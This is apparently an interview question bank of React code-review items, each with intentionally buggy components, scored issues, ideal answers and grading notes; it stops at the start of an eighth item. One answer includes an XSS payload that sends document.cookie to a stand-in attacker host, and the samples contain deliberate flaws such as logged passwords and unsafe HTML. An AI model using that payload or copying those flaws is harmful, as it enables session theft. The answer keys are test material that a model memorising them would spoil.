@@ -1,0 +1,568 @@
+[
+  {
+    "bank_key": "swe.frontend.r.sortable-task-list",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.components_state",
+    "secondary_skill_codes": [
+      "engineering.frontend.accessibility",
+      "engineering.craft.correctness"
+    ],
+    "prompt": "This React component shows a to-do list. Users can add a task, move a task up, and delete a task. Each row is a `TaskRow` component (not shown) that lets the user edit the title in place; it keeps the text being edited in its own state, `useState(task.title)`.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function TaskList({ initialTasks }) {\n  const [tasks, setTasks] = useState(initialTasks);\n  const [title, setTitle] = useState('');\n\n  function addTask(e) {\n    e.preventDefault();\n    if (!title.trim()) return;\n    tasks.push({ id: crypto.randomUUID(), title: title.trim() });\n    setTasks(tasks);\n    setTitle('');\n  }\n\n  function moveUp(index) {\n    const next = [...tasks];\n    [next[index - 1], next[index]] = [next[index], next[index - 1]];\n    setTasks(next);\n  }\n  const remove = (id) => setTasks(tasks.filter((t) => t.id !== id));\n\n  return (\n    <form onSubmit={addTask}>\n      <input value={title} onChange={(e) => setTitle(e.target.value)} placeholder=\"New task\" />\n      <button>Add</button>\n      <ul>\n        {tasks.map((task, index) => (\n          <li key={index}>\n            <TaskRow task={task} />\n            <button type=\"button\" disabled={index === 0} onClick={() => moveUp(index)}>Up</button>\n            <div className=\"icon-delete\" onClick={() => remove(task.id)}>&times;</div>\n          </li>\n        ))}\n      </ul>\n    </form>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "index_as_key_with_reorder",
+          "severity": "major",
+          "points": 2,
+          "description": "Rows use key={index} although tasks can be moved up and deleted. Each TaskRow's own state (the text being edited) stays with the position, not the task, so after \"Up\" or a delete a row shows another task's title and an edit can end up on the wrong task."
+        },
+        {
+          "id": "state_mutated_with_push",
+          "severity": "major",
+          "points": 2,
+          "description": "addTask calls tasks.push() on the state array and then setTasks(tasks) with the same array. React sees no change (the new task only appears because setTitle('') re-renders), and on the first add it also changes the parent's initialTasks array, because useState kept the same reference."
+        },
+        {
+          "id": "delete_is_clickable_div",
+          "severity": "major",
+          "points": 2,
+          "description": "The delete control is a <div> with onClick and a \"×\" character: it cannot be reached with Tab, Enter and Space do nothing, and screen readers do not announce it as a button or say what it deletes."
+        },
+        {
+          "id": "new_task_input_unlabelled",
+          "severity": "minor",
+          "points": 1,
+          "description": "The new-task input has only a placeholder, no label; the placeholder disappears while typing and is not a reliable accessible name."
+        }
+      ],
+      "ideal_answer": "1. Index used as the key while rows can move (major). key={index} ties each TaskRow's state to a position, not to a task. After pressing \"Up\" (or deleting a row), the row in position 1 keeps the draft text of the task that used to be there, so a title appears next to the wrong task and an edit can be applied to the wrong task. Fix: key={task.id}; the ids are already unique and stable.\n2. State is mutated (major). tasks.push(...) changes the state array in place, and setTasks(tasks) passes the same array, so React sees no change. The new task only shows up because setTitle('') happens to cause a render; anything that depends on tasks changing (useMemo, useEffect, a memoised child) misses it. On the first add, tasks is the same array as the parent's initialTasks prop, so the parent's data is changed too. Fix: setTasks((prev) => [...prev, newTask]).\n3. Delete is a clickable div (major). Keyboard users cannot reach it or press it, and screen readers announce only \"times\" as text. Fix: <button type=\"button\" aria-label={`Delete ${task.title}`} onClick={...}> with the icon inside, styled the same.\n4. New-task input has no label (minor). Fix: a visible <label htmlFor> or at least aria-label=\"New task\".\nThe three major issues can come in any order.\nNot a problem: <button>Add</button> has no type. Inside a form the default type is \"submit\", which is exactly what Add should do; the Up button correctly uses type=\"button\" so it does not submit the form.\nValid extras (not false alarms, but not keyed): remove could use the functional form setTasks((prev) => prev.filter(...)); crypto.randomUUID() needs HTTPS or localhost; moving a task could also be offered as \"Down\"; the rows sit inside the add form, so pressing Enter in a TaskRow edit field (if it has no form of its own) submits the add form."
+    },
+    "explanation": "Three majors (index key with reordering, push on state, div as a button) and a minor (placeholder-only input); the majors may come in any order. Behaviour was checked in React 18 with jsdom: after \"Up\" on row 2 the rows show draft \"A\" next to task B and \"B\" next to task A; after an add, the parent's initialTasks array grows from 2 to 3 and the new task still appears because setTitle('') re-renders. A candidate who says \"the new task never appears\" has the right issue and fix but a slightly wrong symptom: give the points. Red herring: the Add button without a type is correct (it is meant to submit). Full marks need key={task.id}, an immutable update, and a real <button> with an accessible name.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.customer-search-box",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.browser_network",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness",
+      "engineering.frontend.accessibility"
+    ],
+    "prompt": "This React component is the customer search box in a support tool. As the support agent types, it fetches matching customers from the API and lists them. Clicking a result opens that customer's account.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function CustomerSearch({ onSelect }) {\n  const [query, setQuery] = useState('');\n  const [results, setResults] = useState([]);\n\n  useEffect(() => {\n    if (query.length < 2) {\n      setResults([]);\n      return;\n    }\n    fetch(`/api/customers?search=${query}`)\n      .then((res) => res.json())\n      .then((data) => setResults(data.customers));\n  }, [query]);\n\n  return (\n    <div className=\"customer-search\">\n      <input\n        type=\"text\"\n        placeholder=\"Search customers\"\n        value={query}\n        onChange={(e) => setQuery(e.target.value)}\n      />\n      <ul>\n        {results.map((c) => (\n          <li key={c.id}>\n            <button type=\"button\" onClick={() => onSelect(c.id)}>\n              {c.name} ({c.email})\n            </button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "out_of_order_responses",
+          "severity": "major",
+          "points": 2,
+          "description": "Every keystroke starts a request and nothing cancels or ignores older ones. If the response for an earlier, shorter query arrives last, it overwrites the newer results, so the list does not match the text in the box and the agent can open the wrong customer."
+        },
+        {
+          "id": "no_error_or_loading_state",
+          "severity": "major",
+          "points": 2,
+          "description": "res.ok is never checked and there is no catch. An error response without `customers` calls setResults(undefined) and results.map crashes the component; a network error is an unhandled rejection that leaves old results on screen. There is no loading or \"no results\" state."
+        },
+        {
+          "id": "query_not_encoded",
+          "severity": "minor",
+          "points": 1,
+          "description": "The search text is put into the URL without encoding, so input such as \"Smith & Sons\" or \"#1042\" breaks the query string (& starts a new parameter, # starts a fragment)."
+        },
+        {
+          "id": "search_input_unlabelled",
+          "severity": "minor",
+          "points": 1,
+          "description": "The input has only a placeholder, no label."
+        }
+      ],
+      "ideal_answer": "1. Responses can arrive out of order (major). Typing \"an\" then \"anna\" sends two requests; if the \"an\" response is slower, it arrives last and replaces the \"anna\" results, so the agent may open the wrong customer. Fix: in the effect, create an AbortController, pass controller.signal to fetch and call controller.abort() in the cleanup (or set an ignore flag in the cleanup and skip setResults when it is set). Debouncing reduces the number of requests but does not fix the ordering by itself.\n2. No error or loading handling (major). If the API returns an error (for example 500 with { error }), data.customers is undefined, setResults(undefined) runs and results.map throws, crashing the component. A network error is an unhandled rejection and the old list stays as if it were current. There is no loading indicator and no \"no customers found\" message. Fix: check res.ok, catch errors (ignore AbortError), keep a status (loading / error / done) and show a message for each; default to [] if customers is missing.\n3. Search text not encoded in the URL (minor). \"Smith & Sons\" sends search=Smith and an extra parameter; \"#1042\" is cut off. Fix: encodeURIComponent(query) or new URLSearchParams({ search: query }).\n4. Input has no label (minor). Fix: a <label> or aria-label=\"Search customers\"; ideally announce the number of results with an aria-live region.\nNot a problem: showing {c.name} and {c.email} as JSX text. React escapes text, so this is not an XSS risk.\nValid extras (not false alarms, but not keyed): debounce typing (about 250 ms) to cut server load; trim the query; arrow-key navigation through the results (combobox pattern)."
+    },
+    "explanation": "Keyed: race between responses (major, wrong customer shown), missing error and loading handling (major, a 500 crashes the component), unencoded query (minor) and missing label (minor). The race and the error handling may come in either order. Red herring: rendering name and email as text is safe because React escapes it; calling it XSS shows a weaker grasp of where XSS happens and earns nothing. \"Add a debounce\" alone earns only partial credit for the race, because a slow response can still arrive after a newer one.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.product-reviews-html",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.security.injection",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state",
+      "engineering.frontend.browser_network"
+    ],
+    "prompt": "This React component shows the customer reviews on a product page. Shoppers write reviews in a plain text box, and the server stores the text exactly as it was typed. Shoppers can also mark a review as helpful.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function ProductReviews({ productId }) {\n  const [reviews, setReviews] = useState([]);\n\n  useEffect(() => {\n    fetch(`/api/products/${productId}/reviews`)\n      .then((res) => res.json())\n      .then(setReviews);\n  }, [productId]);\n\n  function markHelpful(review) {\n    fetch(`/api/reviews/${review.id}/helpful`, { method: 'POST' });\n    review.helpfulCount += 1;\n    setReviews([...reviews]);\n  }\n\n  return (\n    <section>\n      <h2>Reviews ({reviews.length})</h2>\n      {reviews.map((review) => (\n        <article key={review.id}>\n          <strong>{review.authorName}</strong>\n          <p dangerouslySetInnerHTML={{ __html: review.body.replace(/\\n/g, '<br>') }} />\n          <button type=\"button\" onClick={() => markHelpful(review)}>\n            Helpful ({review.helpfulCount})\n          </button>\n        </article>\n      ))}\n    </section>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "xss_dangerously_set_inner_html",
+          "severity": "critical",
+          "points": 3,
+          "description": "review.body is text written by shoppers and is inserted as HTML with dangerouslySetInnerHTML. A review containing <img src=x onerror=\"...\"> runs script in every visitor's browser (stored XSS). Replacing newlines with <br> does not escape anything."
+        },
+        {
+          "id": "no_loading_or_error_state",
+          "severity": "major",
+          "points": 2,
+          "description": "While loading, the page says \"Reviews (0)\", which looks like a product with no reviews; a failed request shows the same and is an unhandled rejection. res.ok is not checked, so an error object from the API reaches setReviews and reviews.map crashes the page."
+        },
+        {
+          "id": "helpful_mutates_state_unchecked",
+          "severity": "major",
+          "points": 2,
+          "description": "markHelpful changes review.helpfulCount directly on the object in state (mutation) and counts the vote before knowing whether the POST worked; a failed request still shows +1, and nothing stops repeated clicks."
+        },
+        {
+          "id": "stale_reviews_on_product_change",
+          "severity": "minor",
+          "points": 1,
+          "description": "When productId changes, the old reviews stay on screen until the new ones arrive, and a slow response for the previous product can arrive last and replace the new product's reviews (no cleanup or abort)."
+        }
+      ],
+      "ideal_answer": "1. Stored XSS through dangerouslySetInnerHTML (critical). Reviews are written by any shopper and stored as typed. A review such as <img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\"> runs in the browser of everyone who opens the product page, so an attacker can act as those users or steal data. The newline replace escapes nothing. Fix: render as text, e.g. <p style={{ whiteSpace: 'pre-line' }}>{review.body}</p>, or split on \"\\n\" and add <br /> elements. If formatting is truly needed, sanitise with a library such as DOMPurify (and sanitise on the server as well).\n2. No loading or error states (major). \"Reviews (0)\" during loading looks like an empty product; a failed request looks the same and is never reported. res.ok is not checked, so if the API returns { error } that object becomes reviews and reviews.map crashes the page. Fix: check res.ok, catch errors, keep loading / error state with a message and a retry.\n3. markHelpful mutates state and ignores the result (major). review.helpfulCount += 1 changes the object inside the current state (a memoised row would not update, and the \"old\" state is changed too). The vote is counted before the POST finishes, a failure still shows +1, and the user can click many times. Fix: setReviews((prev) => prev.map((r) => r.id === review.id ? { ...r, helpfulCount: r.helpfulCount + 1 } : r)), await the POST and roll back or show an error if it fails, and disable the button after voting (the server should still allow only one vote per user).\n4. Stale reviews when productId changes (minor). Fix: clear reviews when productId changes and ignore or abort the old request in the effect cleanup.\nNot a problem: {review.authorName} is rendered as text, and React escapes it. Only the dangerouslySetInnerHTML line is unsafe.\nValid extras (not false alarms, but not keyed): show the total review count from the API if reviews are paginated; give the helpful button an accessible label that names the review author."
+    },
+    "explanation": "The XSS must come first for full marks: it lets any shopper run script for every visitor. The two majors (missing loading/error states, mutating helpfulCount without checking the POST) may come in either order. Red herring: authorName in JSX is escaped, so flagging it as XSS earns nothing. \"Sanitise the HTML\" is full credit only if the candidate names a real sanitiser (or rendering as text); \"escape < and > with replace\" is partial credit.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.login-form-token",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.security.data_protection",
+    "secondary_skill_codes": [
+      "engineering.security.auth",
+      "engineering.frontend.accessibility"
+    ],
+    "prompt": "This React component is the login form of a customer portal, which is served only over HTTPS. After login, other parts of the app read the token from storage and send it with every API call. The site uses an error-monitoring tool that records console output.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function LoginForm({ onLoggedIn }) {\n  const [email, setEmail] = useState('');\n  const [password, setPassword] = useState('');\n  const [error, setError] = useState(null);\n\n  async function handleSubmit(e) {\n    e.preventDefault();\n    console.log('Login attempt', { email, password });\n    const res = await fetch('/api/login', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ email, password }),\n    });\n    const data = await res.json();\n    if (!res.ok) {\n      setError(data.message);\n      return;\n    }\n    localStorage.setItem('authToken', data.token);\n    console.log('Logged in, token:', data.token);\n    onLoggedIn(data.user);\n  }\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input type=\"email\" placeholder=\"Email\" value={email}\n        onChange={(e) => setEmail(e.target.value)} />\n      <input type=\"password\" placeholder=\"Password\" value={password}\n        onChange={(e) => setPassword(e.target.value)} />\n      {error && <p className=\"error\">{error}</p>}\n      <button type=\"submit\">Log in</button>\n    </form>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "secrets_logged_to_console",
+          "severity": "critical",
+          "points": 3,
+          "description": "The password (in \"Login attempt\") and the token (in \"Logged in\") are written to the console. The error-monitoring tool records console output, so passwords and tokens are sent to a third party and stored there; they are also visible to anyone with developer tools open."
+        },
+        {
+          "id": "token_in_local_storage",
+          "severity": "major",
+          "points": 2,
+          "description": "The auth token is stored in localStorage, where any script on the page (an XSS bug anywhere on the site, or a compromised third-party script) can read it and send it away; it also stays there after the browser is closed."
+        },
+        {
+          "id": "unhandled_network_errors_no_loading",
+          "severity": "major",
+          "points": 2,
+          "description": "If the network fails, fetch throws; if a proxy returns an HTML error page, res.json() throws. Neither is caught, so the user sees nothing. With no loading state, the button stays active and users click again, sending several login requests."
+        },
+        {
+          "id": "inputs_unlabelled_error_not_announced",
+          "severity": "minor",
+          "points": 1,
+          "description": "The inputs have placeholders but no labels or autocomplete attributes, and the error message is not announced to screen-reader users (no role=\"alert\" or aria-live)."
+        }
+      ],
+      "ideal_answer": "1. Password and token written to the console (critical). The monitoring tool captures console output, so every user's password and token are sent to and stored by a third party, where staff of either company can read them; anyone with developer tools open sees them too. Fix: remove both logs and never log credentials or tokens; if needed, log only \"login failed\" with a status code. Treat already-captured data as leaked: purge it from the tool and consider forcing password resets.\n2. Token in localStorage (major). Any script running on the page can read localStorage, so a single XSS bug or a compromised third-party script can steal sessions; the token also outlives the browser session. Fix: let the server set the session in an HttpOnly, Secure, SameSite cookie, which page scripts cannot read; if a bearer token must be used, keep it in memory only, short-lived, with a refresh flow based on an HttpOnly cookie.\n3. Network and server errors not handled, no loading state (major). A network failure or a non-JSON error page makes fetch or res.json() throw; the error is unhandled and the form just does nothing. Fix: wrap in try/catch and show a general message; add a submitting state that disables the button and shows progress.\n4. Inputs unlabelled and error not announced (minor). Fix: <label htmlFor> for each input, autoComplete=\"username\" and \"current-password\" so password managers work, and role=\"alert\" on the error paragraph.\nNot a problem: sending the password in the JSON body of a POST. HTTPS protects it in transit; hashing it in the browser would not add security, because the hash would simply become the password.\nValid extras (not false alarms, but not keyed): show the same message for an unknown email and a wrong password; clear the password field after a failed attempt; data.message could be missing, so have a fallback text."
+    },
+    "explanation": "Logging the password and token is the most serious issue, because the prompt says console output is recorded by a third-party tool: every login leaks credentials. localStorage is major (exposed to any XSS), not critical on its own, because exploiting it needs a second bug. The unhandled errors are major because login silently fails. Red herring: suggesting client-side password hashing shows a misunderstanding and earns nothing; HTTPS is the correct protection. A candidate who ranks localStorage above the logging still earns the points for both, with a small deduction for order.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.session-context-provider",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.components_state",
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering",
+      "engineering.security.auth"
+    ],
+    "prompt": "This provider wraps the whole app. It loads the logged-in user, refreshes the access token every 10 minutes (each token is valid for 15 minutes), and lets any component read the session or log out. About 200 components call `useSession()`. `api.get` and `api.post` return the parsed JSON body and throw on any error status.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "const SessionContext = createContext(null);\n\nexport function SessionProvider({ children }) {\n  const [user, setUser] = useState(null);\n  const [token, setToken] = useState(null);\n\n  useEffect(() => {\n    api.get('/me').then((res) => {\n      setUser(res.user);\n      setToken(res.token);\n    });\n  }, []);\n\n  useEffect(() => {\n    setInterval(async () => {\n      const res = await api.post('/refresh', { token });\n      setToken(res.token);\n    }, 10 * 60 * 1000);\n  }, []);\n\n  function logout() {\n    api.post('/logout');\n    setUser(null);\n  }\n\n  return (\n    <SessionContext.Provider value={{ user, token, logout }}>\n      {children}\n    </SessionContext.Provider>\n  );\n}\n\nexport const useSession = () => useContext(SessionContext);\n"
+      },
+      "issues": [
+        {
+          "id": "stale_token_in_interval",
+          "severity": "critical",
+          "points": 3,
+          "description": "The refresh interval is created in an effect with an empty dependency list, so its callback always sees `token` from the first render, which is null. Every refresh sends { token: null } and fails, so every user's session stops working when the first token expires after 15 minutes."
+        },
+        {
+          "id": "interval_not_cleared_logout_incomplete",
+          "severity": "major",
+          "points": 2,
+          "description": "The interval is never cleared: a remount (and React StrictMode in development) starts another one, and it keeps running after logout. logout() clears the user but keeps the token in memory, does not wait for or check the /logout call, and does not stop the refresh."
+        },
+        {
+          "id": "inline_context_value",
+          "severity": "minor",
+          "points": 1,
+          "description": "value={{ user, token, logout }} creates a new object and a new logout function on every render, so all 200 consumers re-render whenever the provider renders, including memoised ones that only use the user."
+        },
+        {
+          "id": "no_loading_state_for_me",
+          "severity": "minor",
+          "points": 1,
+          "description": "Until /me answers, user is null, which looks the same as \"logged out\", so pages may flash or redirect to login; if /me fails, the rejection is not handled."
+        }
+      ],
+      "ideal_answer": "1. The refresh uses a stale token (critical). The interval callback is created once, during the first effect run, and closes over token from the first render: null. Every refresh posts { token: null }, the server rejects it, api.post throws inside the interval (unhandled), and the token is never replaced. About 15 minutes after page load every API call fails and users are thrown out. Fix: read the current token from a ref (tokenRef.current, kept in sync with state), or put the refresh in an effect that depends on token; better still, refresh with an HttpOnly refresh cookie so browser code never needs the old token. Handle a failed refresh by logging the user out cleanly.\n2. Interval never cleared, logout incomplete (major). There is no cleanup, so remounting the provider (or StrictMode in development) runs two refresh loops, and refreshes continue after logout. logout() leaves token in memory, ignores whether /logout succeeded, and the loop keeps the old session alive. Fix: const id = setInterval(...); return () => clearInterval(id); only run the loop while a user is logged in; on logout clear token and user, stop the loop, and handle a failed /logout call.\n3. New context value on every render (minor). Every consumer re-renders on each provider render, even memoised components, because the value object and logout are new each time. Fix: useCallback for logout and useMemo for the value. Note that the token changes every 10 minutes, so with one context all 200 consumers still re-render then; splitting the token into its own context (most components only need the user) fixes that.\n4. No loading or error state for /me (minor). Consumers cannot tell \"still loading\" from \"logged out\". Fix: expose a status (loading / authenticated / anonymous / error) and catch the /me failure.\nNot a problem: the first effect's empty dependency list. It should run once on mount, and setUser and setToken are stable, so no dependency is missing there.\nValid extras (not false alarms, but not keyed): keeping the token in memory is better than localStorage, but an HttpOnly cookie is better still; useSession could throw a clear error when used outside the provider."
+    },
+    "explanation": "The stale closure is the key insight and is critical because it breaks every session after 15 minutes; it was confirmed in React 18 with jsdom (both refresh calls posted { token: null }). The missing cleanup plus the incomplete logout is major. The inline context value is minor here: it matters, but it is a performance cost, not a broken feature; a candidate who adds that useMemo alone does not stop the 10-minute re-render shows senior-level depth. Red herring: the /me effect with [] is correct. A candidate who says only \"add token to the dependency list\" fixes the stale value but, without cleanup, creates a new interval on every refresh; give partial credit unless cleanup is also mentioned.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.live-orders-polling",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.craft.correctness",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state",
+      "engineering.frontend.browser_network"
+    ],
+    "prompt": "This React component shows a store's open orders on a screen in the packing area, and refreshes every 5 seconds. Staff switch between stores with a drop-down in the parent component, which changes `storeId`. The component is also opened and closed often as staff move between pages. The app is rendered only in the browser (no server-side rendering).\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function LiveOrders({ storeId }) {\n  const [orders, setOrders] = useState([]);\n  const [isNarrow, setIsNarrow] = useState(window.innerWidth < 600);\n\n  useEffect(() => {\n    window.addEventListener('resize', () => setIsNarrow(window.innerWidth < 600));\n  }, []);\n\n  useEffect(() => {\n    async function load() {\n      const res = await fetch(`/api/stores/${storeId}/orders?status=open`);\n      setOrders(await res.json());\n    }\n    load();\n    setInterval(load, 5000);\n  }, [storeId]);\n\n  return (\n    <table>\n      <thead>\n        <tr><th>Order</th>{!isNarrow && <th>Customer</th>}<th>Total</th></tr>\n      </thead>\n      <tbody>\n        {orders.map((o) => (\n          <tr key={o.id}>\n            <td>{o.number}</td>\n            {!isNarrow && <td>{o.customerName}</td>}\n            <td>{o.total}</td>\n          </tr>\n        ))}\n      </tbody>\n    </table>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "polling_interval_never_cleared",
+          "severity": "critical",
+          "points": 3,
+          "description": "setInterval is never cleared. Each storeId change adds another interval while the old ones keep loading the previous stores, so the table flips between stores every few seconds and staff can pack another store's orders; after leaving the page, polling never stops."
+        },
+        {
+          "id": "poll_errors_not_handled",
+          "severity": "major",
+          "points": 2,
+          "description": "res.ok is never checked and nothing catches errors. A failed poll is an unhandled rejection every 5 seconds; an error response's JSON body replaces orders with an object and orders.map crashes the screen. Staff cannot tell when the list has stopped updating."
+        },
+        {
+          "id": "resize_listener_never_removed",
+          "severity": "minor",
+          "points": 1,
+          "description": "An anonymous resize listener is added on every mount and never removed, so listeners pile up as the component is opened and closed, each keeping the old component's closure alive. The leaked handler only calls a state setter of an unmounted component (a no-op in React 18), so the cost is memory and wasted work, not wrong data."
+        }
+      ],
+      "ideal_answer": "1. Polling interval never cleared (critical). After switching from store 1 to 2 to 3, three intervals are running and each one loads a different store; whichever response lands last fills the table, so the screen flips between stores and staff may pack the wrong orders. When the component closes, the intervals keep polling forever. Fix: const id = setInterval(load, 5000); return () => clearInterval(id); and ignore late responses after cleanup (an active flag or AbortController), so a slow response for the old store cannot arrive after the switch. Clear the list or show \"loading\" when storeId changes.\n2. Poll errors not handled (major). A network error is an unhandled rejection on every tick; an error status with a JSON body ({ error }) replaces orders and orders.map throws, crashing the screen. Fix: check res.ok, catch errors, keep the last good list, and show an error message or a \"last updated\" time so staff know when data is stale.\n3. Resize listener never removed (minor). Fix: name the handler and call removeEventListener in the effect cleanup; or hide the column with a CSS media query and drop the JavaScript, which also avoids a re-render on every resize event.\nNot a problem: useState(window.innerWidth < 600) as the initial value. This is a client-rendered page, so window exists; it would only matter with server-side rendering.\nValid extras (not false alarms, but not keyed): pause polling while the tab is hidden (document.visibilityState); use server-sent events or websockets if 5-second freshness matters; the table has no caption."
+    },
+    "explanation": "Behaviour was checked in React 18 with jsdom: after two storeId changes, three intervals were alive and one tick fetched stores 1, 2 and 3. Critical because staff see another store's orders. Unhandled poll errors are major (screen crash, silently stale data). The resize leak is minor: real, but the leaked handler only calls setIsNarrow on an unmounted component (a no-op in React 18), so it costs memory and some work on resize and never shows wrong data. That is the difference from a leaked listener that runs app logic (see the confirm-delete dialog, where it deletes projects). A candidate who rates it major loses only a little ordering credit, as long as the interval comes first. Red herring: reading window.innerWidth in the initial state is fine in a client-only page; flagging it as an SSR bug earns nothing unless the candidate notes it only matters with server rendering. Full marks need clearInterval in a cleanup and some protection against late responses.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.cart-derived-total",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.components_state",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness",
+      "engineering.frontend.accessibility"
+    ],
+    "prompt": "This React component shows the shopping cart. Shoppers can change the quantity of an item, remove an item, and place the order. `formatPrice()` formats a number as a price.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function Cart({ initialItems }) {\n  const [items, setItems] = useState(initialItems);\n  const [total, setTotal] = useState(initialItems.reduce((s, i) => s + i.price * i.qty, 0));\n\n  function changeQty(id, qty) {\n    const item = items.find((i) => i.id === id);\n    setItems(items.map((i) => (i.id === id ? { ...i, qty } : i)));\n    setTotal(total + (qty - item.qty) * item.price);\n  }\n\n  const removeItem = (id) => setItems(items.filter((i) => i.id !== id));\n  async function placeOrder() {\n    await fetch('/api/orders', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ items, total }),\n    });\n    window.location.href = '/order-confirmed';\n  }\n\n  return (\n    <div>\n      {items.map((item) => (\n        <div key={item.id} className=\"cart-row\">\n          <span>{item.name}</span>\n          <input type=\"number\" min=\"1\" value={item.qty}\n            onChange={(e) => changeQty(item.id, Number(e.target.value))} />\n          <button type=\"button\" onClick={() => removeItem(item.id)}>Remove</button>\n        </div>\n      ))}\n      <p>Total: {formatPrice(total)}</p>\n      <button type=\"button\" onClick={placeOrder}>Place order</button>\n    </div>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "duplicated_total_out_of_sync",
+          "severity": "critical",
+          "points": 3,
+          "description": "total is kept in its own state and updated by hand. removeItem never updates it, so after removing an item the cart shows, and sends with the order, a total that is too high."
+        },
+        {
+          "id": "place_order_ignores_failure_double_submit",
+          "severity": "major",
+          "points": 2,
+          "description": "placeOrder never checks res.ok, so a 4xx or 5xx still sends the shopper to /order-confirmed although no order was created; a network error is unhandled. The button stays active while the request runs, so a double click sends two orders."
+        },
+        {
+          "id": "quantity_accepts_zero_and_invalid",
+          "severity": "minor",
+          "points": 1,
+          "description": "Number(e.target.value) turns an empty field into 0, and min=\"1\" does not stop typed values, so a quantity of 0, a negative number or a decimal is accepted and sent."
+        },
+        {
+          "id": "quantity_inputs_unlabelled",
+          "severity": "minor",
+          "points": 1,
+          "description": "Each quantity input has no label, so a screen reader announces only \"spin button, 2\" with no item name."
+        }
+      ],
+      "ideal_answer": "1. Total stored separately and out of sync (critical). total duplicates information that is already in items. removeItem forgets to update it, so removing a 10.00 item from a 20.00 cart still shows 20.00, and that wrong total is sent with the order. Fix: delete the total state and calculate it during render: const total = items.reduce((s, i) => s + i.price * i.qty, 0) (useMemo only if it is ever slow). The server must also calculate the price itself and never trust a total sent by the browser.\n2. placeOrder ignores failures and allows double orders (major). fetch only rejects on network errors, so a 500 or 400 still redirects to the confirmation page and the shopper believes they ordered. There is no \"placing\" state, so a double click creates two orders. Fix: disable the button and show progress while submitting, check res.ok, stay on the page with an error message if it failed, catch network errors, and send an idempotency key so a retry cannot create a second order.\n3. Quantity accepts 0 and invalid values (minor). Clearing the field sets qty to 0; typed negatives and decimals pass. Fix: validate before updating (a whole number from 1 to a sensible maximum), or keep the raw text while typing and validate on blur.\n4. Quantity inputs have no labels (minor). Fix: aria-label={`Quantity of ${item.name}`} or a visually hidden <label>.\nThe critical and the major may come in either order.\nNot a problem: useState(initialItems) does not react to later prop changes. The prop is named as a starting value, and after that the cart owns its items.\nValid extras (not false alarms, but not keyed): changeQty and removeItem could use functional updates; prices as floating point can round badly (integer cents are safer); the Remove buttons could include the item name for screen readers."
+    },
+    "explanation": "Behaviour was checked in React 18 with jsdom: removing the 10.00 item from a 20.00 cart left \"Total: 20.00\". The wrong total is critical because it is money shown and submitted at checkout. The checkout failure handling is major (lost or duplicate orders); either order of these two is fine. Red herring: initialItems is intentionally only a starting value. A candidate who fixes the total by adding setTotal to removeItem gets partial credit; full credit needs deriving the total from items, because duplicated state will drift again with the next change.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.order-details-route",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
